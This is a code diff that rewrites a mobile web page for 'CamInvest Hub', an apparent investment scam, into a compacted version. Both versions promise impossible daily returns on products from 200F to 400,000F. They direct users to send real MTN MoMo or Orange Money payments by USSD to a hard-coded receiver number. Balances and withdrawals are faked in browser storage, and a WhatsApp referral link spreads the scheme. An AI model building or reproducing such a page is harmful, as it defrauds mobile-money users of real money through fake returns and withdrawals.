@@ -1,90 +1,16 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>CamInvest Hub</title>
-<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
-<style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Arial}
-body{background:#0a1931;color:#fff;padding-bottom:75px}
-.top{background:#0a1931;padding:8px;text-align:center;font-size:11px;color:#9fb0d0}
-.btns{display:flex;gap:10px;padding:8px 10px}
-.btns button{flex:1;padding:12px;border:0;border-radius:25px;font-weight:800}
-.icons{background:#fff;margin:10px;border-radius:14px;padding:14px 0;display:flex;justify-content:space-around;color:#000}
-.icons div{text-align:center;font-size:11px;cursor:pointer}
-.plan{display:flex;margin:10px;border-radius:14px;overflow:hidden;background:#fff;color:#000}
-.img{width:105px;min-height:115px;background-size:cover;background-position:center;display:flex;align-items:flex-end;padding:6px}
-.img span{background:#000;color:#fff;padding:4px 10px;border-radius:15px;font-size:11px;font-weight:800}
-.info{flex:1;padding:10px}
-.info b{font-size:13px} .info small{font-size:11px;color:#555;display:block;line-height:1.3}
-.green{color:#00a651;font-weight:700;font-size:12px}
-.buy{width:100%;background:#0a1931;color:#fff;border:0;padding:11px;border-radius:22px;margin-top:8px;font-weight:700}
-.bottom{position:fixed;bottom:0;left:0;right:0;background:#fff;display:flex;justify-content:space-around;padding:8px 0 12px;border-top:1px solid #ddd}
-.bottom div{font-size:10px;color:#888;text-align:center}
-.modal{position:fixed;inset:0;background:rgba(0,0,0,0.85);display:none;justify-content:center;align-items:flex-start;z-index:99;padding:10px;overflow:auto}
-.box{background:#fff;color:#000;width:100%;max-width:400px;border-radius:16px;padding:16px;margin-top:20px}
-.box input,.box select{width:100%;padding:14px;margin:6px 0 10px;border:1px solid #ccc;border-radius:10px}
-.tip{background:#dcfce7;border:1px solid #16a34a;padding:10px;border-radius:10px;font-size:12px;margin:8px 0}
-</style>
-</head>
-<body>
-
-<div class="top">Balance: <b id="b" style="color:#fff">115F</b> | Video: 0/10 | Receiver: 678657567</div>
-
-<div class="btns">
-<button style="background:#00c853;color:#fff" onclick="shareWA()">WhatsApp Share</button>
-<button style="background:#ffca28" onclick="copyL()">COPY LINK</button>
-</div>
-
-<div style="display:none" id="link">https://caminvest-hub.vercel.app/?ref=CAMI-678657567</div>
-
-<div class="icons">
-<div onclick="openD()">💳<br>Recharge</div>
-<div onclick="openW()">🏧<br>Withdraw</div>
-<div>🎬<br>Tasks</div>
-<div>👥<br>Team</div>
-</div>
-
-<div style="padding:10px;font-weight:800">🔥 Products 200F - 400,000F | Rice, Car, House, Company</div>
-
-<div class="plan"><div class="img" style="background-image:url('https://images.unsplash.com/photo-1586201375761-83865001e31c?w=300')"><span>200F</span></div><div class="info"><b>🌾 Rice Investment 200F</b><small>Buy 1 bag rice, sell profit</small><small>40F/day x 365D = 14,600F</small><div class="green">Profit: 14,400F</div><button class="buy" onclick="buyP(200)">BUY NOW 200F</button></div></div>
-<div class="plan"><div class="img" style="background-image:url('https://images.unsplash.com/photo-1556740738-b6a63e27c4df?w=300')"><span>500F</span></div><div class="info"><b>🏪 Small Shop 500F</b><small>Invest in provision store</small><small>165F/day x 30D = 4,950F</small><div class="green">Profit: 4,450F</div><button class="buy" onclick="buyP(500)">BUY NOW 500F</button></div></div>
-<div class="plan"><div class="img" style="background-image:url('https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?w=300')"><span>1KF</span></div><div class="info"><b>📱 Phone Business 1,000F</b><small>Buy & sell phones</small><small>350F/day x 30D = 10,500F</small><div class="green">Profit: 9,500F</div><button class="buy" onclick="buyP(1000)">BUY NOW 1,000F</button></div></div>
-<div class="plan"><div class="img" style="background-image:url('https://images.unsplash.com/photo-1558981403-c5f9899a28bc?w=300')"><span>5KF</span></div><div class="info"><b>🏍️ Moto Taxi 5,000F</b><small>Invest in okada business</small><small>1,800F/day x 30D = 54,000F</small><div class="green">Profit: 49,000F</div><button class="buy" onclick="buyP(5000)">BUY NOW 5,000F</button></div></div>
-<div class="plan"><div class="img" style="background-image:url('https://images.unsplash.com/photo-1494976388531-d1058494cdd8?w=300')"><span>20KF</span></div><div class="info"><b>🚗 Car Taxi 20,000F</b><small>Invest in car taxi business</small><small>7,500F/day x 30D = 225,000F</small><div class="green">Profit: 205,000F</div><button class="buy" onclick="buyP(20000)">BUY NOW 20,000F</button></div></div>
-<div class="plan"><div class="img" style="background-image:url('https://images.unsplash.com/photo-1568605114967-8130f3a36994?w=300')"><span>100KF</span></div><div class="info"><b>🏠 House Rental 100,000F</b><small>Buy house, collect rent</small><small>40,000F/day x 30D = 1.2M</small><div class="green">Profit: 1,100,000F</div><button class="buy" onclick="buyP(100000)">BUY NOW 100,000F</button></div></div>
-<div class="plan"><div class="img" style="background-image:url('https://images.unsplash.com/photo-1492144534655-ae79c964c9d7?w=300')"><span>400KF</span></div><div class="info"><b>💎 Luxury 400,000F</b><small>Company CEO share</small><small>180,000F/day x 30D = 5.4M</small><div class="green">Profit: 5,000,000F</div><button class="buy" onclick="buyP(400000)">BUY NOW 400,000F</button></div></div>
-
-<div id="depM" class="modal"><div class="box"><h3>Recharge to 678657567</h3><input id="dPhone" type="tel" placeholder="Your Number"><input id="dAmt" type="number" value="200"><select id="dMet"><option>MTN MoMo</option><option>Orange Money</option></select><div class="tip">Receiver: <b>678657567</b> - Your account<br>Dialer: *126*1*1*678657567*amount#</div><button onclick="doDep()" style="width:100%;background:#ffca28;padding:14px;border:0;border-radius:12px;font-weight:800">📞 SUBMIT & OPEN DIALER</button><button onclick="closeM()" style="width:100%;background:#eee;padding:10px;border:0;border-radius:10px;margin-top:8px">Cancel</button></div></div>
-<div id="withM" class="modal"><div class="box"><h3>Withdraw FROM 678657567</h3><input id="wAmt" type="number" placeholder="Min 200"><input id="wMo" placeholder="Your MoMo"><div class="tip">FROM 678657567 TO your number</div><button onclick="doWith()" style="width:100%;background:#0a1931;color:#fff;padding:14px;border:0;border-radius:12px">WITHDRAW</button><button onclick="closeM()" style="width:100%;background:#eee;padding:10px;border:0;border-radius:10px;margin-top:8px">Cancel</button></div></div>
-
-<div class="bottom"><div>🏠<br>Home</div><div>📋<br>Orders</div><div>🎬<br>Tasks</div><div>👥<br>Team</div><div>👤<br>Me</div></div>
-
-<script>
-const MY="678657567";
-let bal=parseInt(localStorage.getItem('c_bal')||'115');
-let ph=localStorage.getItem('c_phone')||'';
-function upd(){document.getElementById('b').innerText=bal+'F'; document.getElementById('link').innerText='https://caminvest-hub.vercel.app/?ref=CAMI-'+(ph||MY);}
-upd();
-function openD(){document.getElementById('dPhone').value=ph||''; document.getElementById('depM').style.display='flex';}
-function openW(){document.getElementById('wMo').value=ph||''; document.getElementById('withM').style.display='flex';}
-function closeM(){document.getElementById('depM').style.display='none'; document.getElementById('withM').style.display='none';}
-function doDep(){
- let p=document.getElementById('dPhone').value.trim(); let a=document.getElementById('dAmt').value.trim(); let m=document.getElementById('dMet').value;
- if(!p||!a||a<200) return alert('Min 200F');
- localStorage.setItem('c_phone',p); ph=p; upd();
- let ussd=m.includes('MTN')?`*126*1*1*${MY}*${a}#`:`#150*1*1*${MY}*${a}#`;
- if(confirm(`Send REAL ${a}F to ${MY}?\n${ussd}`)){
-   window.location.href='tel:'+encodeURIComponent(ussd);
-   setTimeout(()=>{let t=prompt(`Enter Txn ID after sending ${a}F to ${MY}:`); if(t) alert('✅ Txn '+t+' submitted! Verify on '+MY); closeM();},7000);
- }
-}
-function doWith(){let a=parseInt(document.getElementById('wAmt').value); let mo=document.getElementById('wMo').value; if(!a||!mo||a<200) return alert('Min 200'); if(a>bal) return alert('Low '+bal+'F'); bal-=a; localStorage.setItem('c_bal',bal); upd(); alert('Withdraw '+a+'F FROM '+MY+' TO '+mo+' - Send manually from MoMo app'); closeM();}
-function buyP(p){if(bal<p) return alert('Need '+p+'F have '+bal+'F - Recharge to '+MY); bal-=p; localStorage.setItem('c_bal',bal); upd(); alert('Bought '+p+'F');}
-function copyL(){navigator.clipboard.writeText(document.getElementById('link').innerText); alert('Copied!');}
-function shareWA(){window.open('https://wa.me/?text='+encodeURIComponent(document.getElementById('link').innerText),'_blank');}
-</script>
-</body>
-</html>
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CamInvest 678657567</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:Arial}body{background:#0a1931;color:#fff;padding-bottom:70px}.top{background:#12244f;padding:8px;text-align:center;font-size:11px}.btns{display:flex;gap:8px;padding:8px}.btns button{flex:1;padding:12px;border:0;border-radius:20px;font-weight:700}.icons{background:#fff;margin:10px;border-radius:12px;padding:12px 0;display:flex;justify-content:space-around;color:#000}.icons div{font-size:11px;text-align:center}.plan{display:flex;margin:10px;background:#fff;color:#000;border-radius:12px;overflow:hidden}.img{width:90px;background:#ddd;display:flex;align-items:center;justify-content:center;font-weight:800;color:#fff}.info{flex:1;padding:10px;font-size:12px}.buy{width:100%;background:#0a1931;color:#fff;border:0;padding:8px;border-radius:15px;margin-top:5px}.modal{position:fixed;inset:0;background:#000c;display:none;justify-content:center;padding:10px;z-index:99}.box{background:#fff;color:#000;width:100%;max-width:380px;border-radius:12px;padding:14px;margin-top:20px}.box input,.box select{width:100%;padding:12px;margin:6px 0;border:1px solid #ccc;border-radius:8px}</style></head><body>
+<div class="top">Bal: <b id="b">115F</b> | Receiver: 678657567</div>
+<div class="btns"><button style="background:#00c853;color:#fff" onclick="location.href='https://wa.me/?text='+document.getElementById('L').innerText">WhatsApp</button><button style="background:#ffca28" onclick="navigator.clipboard.writeText(document.getElementById('L').innerText);alert('Copied')">COPY LINK</button></div>
+<div style="display:none" id="L">https://caminvest-hub.vercel.app/?ref=CAMI-678657567</div>
+<div class="icons"><div onclick="openD()">💳<br>Recharge</div><div onclick="openW()">🏧<br>Withdraw</div><div>🎬<br>Tasks</div><div>👥<br>Team</div></div>
+<div style="padding:10px;font-weight:700">🔥 Products 200F-400KF</div>
+<div class="plan"><div class="img" style="background:#0a1931">200F</div><div class="info"><b>Rice 200F</b><br>40F/day x 365=14600F<br><button class="buy" onclick="buyP(200)">BUY 200F</button></div></div>
+<div class="plan"><div class="img" style="background:#e67e22">500F</div><div class="info"><b>Shop 500F</b><br>165F/day x 30<br><button class="buy" onclick="buyP(500)">BUY 500F</button></div></div>
+<div class="plan"><div class="img" style="background:#0f9d4a">1KF</div><div class="info"><b>Phone 1000F</b><br>350F/day<br><button class="buy" onclick="buyP(1000)">BUY 1K</button></div></div>
+<div class="plan"><div class="img" style="background:#8e44ad">5KF</div><div class="info"><b>Moto 5000F</b><br>1800F/day<br><button class="buy" onclick="buyP(5000)">BUY 5K</button></div></div>
+<div class="plan"><div class="img" style="background:#c0392b">20KF</div><div class="info"><b>Car 20000F</b><br>7500F/day<br><button class="buy" onclick="buyP(20000)">BUY 20K</button></div></div>
+<div class="plan"><div class="img" style="background:#222">100KF</div><div class="info"><b>House 100K</b><br>40000F/day<br><button class="buy" onclick="buyP(100000)">BUY 100K</button></div></div>
+<div class="plan"><div class="img" style="background:#000">400KF</div><div class="info"><b>Luxury 400K</b><br>180000F/day<br><button class="buy" onclick="buyP(400000)">BUY 400K</button></div></div>
+<div id="dM" class="modal"><div class="box"><h3>Recharge to 678657567</h3><input id="dP" placeholder="Your Number"><input id="dA" type="number" value="200"><select><option>MTN MoMo</option><option>Orange</option></select><div style="background:#dcfce7;padding:8px;border-radius:8px;font-size:11px">Receiver: <b>678657567</b> USSD: *126*1*1*678657567*amount#</div><button onclick="doD()" style="width:100%;background:#ffca28;padding:12px;border:0;border-radius:10px;font-weight:800;margin-top:8px">SUBMIT & OPEN DIALER</button><button onclick="closeM()" style="width:100%;background:#eee;padding:8px;border:0;border-radius:8px;margin-top:6px">Cancel</button></div></div>
+<div id="wM" class="modal"><div class="box"><h3>Withdraw FROM 678657567</h3><input id="wA" placeholder="Amount"><input id="wN" placeholder="Your MoMo"><button onclick="doW()" style="width:100%;background:#0a1931;color:#fff;padding:12px;border:0;border-radius:10px">WITHDRAW</button><button onclick="closeM()" style="width:100%;background:#eee;padding:8px;border:0;border-radius:8px;margin-top:6px">Cancel</button></div></div>
+<script>const MY="678657567";let bal=parseInt(localStorage.getItem('c_bal')||'115');function upd(){document.getElementById('b').innerText=bal+'F'}upd();function openD(){document.getElementById('dM').style.display='flex'}function openW(){document.getElementById('wM').style.display='flex'}function closeM(){document.getElementById('dM').style.display='none';document.getElementById('wM').style.display='none'}function doD(){let p=document.getElementById('dP').value;let a=document.getElementById('dA').value;if(!p||!a)return alert('Enter');localStorage.setItem('c_phone',p);let u=`*126*1*1*${MY}*${a}#`;if(confirm(a+'F to '+MY+'? '+u)){location.href='tel:'+encodeURIComponent(u);setTimeout(()=>{let t=prompt('Txn ID after sending to '+MY+':');if(t)alert('Txn '+t+' submitted!');closeM()},6000)}}function doW(){let a=parseInt(document.getElementById('wA').value);let m=document.getElementById('wN').value;if(a>bal)return alert('Low '+bal);bal-=a;localStorage.setItem('c_bal',bal);upd();alert(a+'F FROM '+MY+' TO '+m+' pending');closeM()}function buyP(p){if(bal<p)return alert('Need '+p+'F have '+bal+'F Recharge to '+MY);bal-=p;localStorage.setItem('c_bal',bal);upd();alert('Bought '+p+'F')}</script></body></html>
